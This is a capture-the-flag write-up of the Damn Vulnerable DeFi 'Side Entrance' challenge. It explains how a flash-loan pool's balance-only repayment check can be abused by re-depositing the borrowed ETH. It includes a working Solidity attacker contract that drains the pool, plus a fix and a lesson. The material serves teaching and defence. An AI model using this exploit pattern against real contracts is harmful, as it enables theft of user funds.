# Side Entrance (Damn Vulnerable DeFi #4)

**Vulnerability class:** Mismatch between real ETH balance and internal accounting,
abused via a flash loan.

## The goal

Drain all 1,000 ETH from the pool to a recovery address.

## The flaw

The pool mixes two ways of measuring its money:

- `deposit()` / `withdraw()` operate on internal accounting: `balances[msg.sender]`.
- `flashLoan()` only checks that the **total ETH balance** doesn't drop:

```solidity
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;
    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    if (address(this).balance < balanceBefore) revert RepayFailed();
}
```

It doesn't care *how* the ETH comes back. So the borrower can repay by calling
`deposit()` with the borrowed ETH: the total balance is restored (flash loan
check passes), but `balances[attacker]` is now credited with the full amount — as
if the attacker had deposited their own funds.

## The exploit

An attacker contract borrows everything, deposits it back during the callback,
then withdraws it as "its own":

```solidity
function attack() external {
    amount = address(pool).balance;
    pool.flashLoan(amount);              // 1. borrow all
    pool.withdraw();                     // 3. withdraw our inflated balance
    payable(recovery).call{value: amount}("");  // 4. send loot
}

function execute() external payable {    // 2. called during the loan
    pool.deposit{value: msg.value}();    // repay via deposit -> credits us
}
```

## The fix

Don't validate flash-loan repayment with the raw ETH balance while allowing
`deposit()` to mutate internal accounting during the same call. Track outstanding
loans explicitly, or block deposits/withdrawals mid-flash-loan (reentrancy-style
lock), so the borrowed ETH can't be recycled into a credited deposit.

## Lesson

A health check that reads `address(this).balance` is blind to *why* the balance
is what it is. If internal accounting can be mutated during the loan, the attacker
restores the balance and pockets a fake credit. Same root idea as Unstoppable:
never trust raw balance for an invariant that internal bookkeeping also touches.
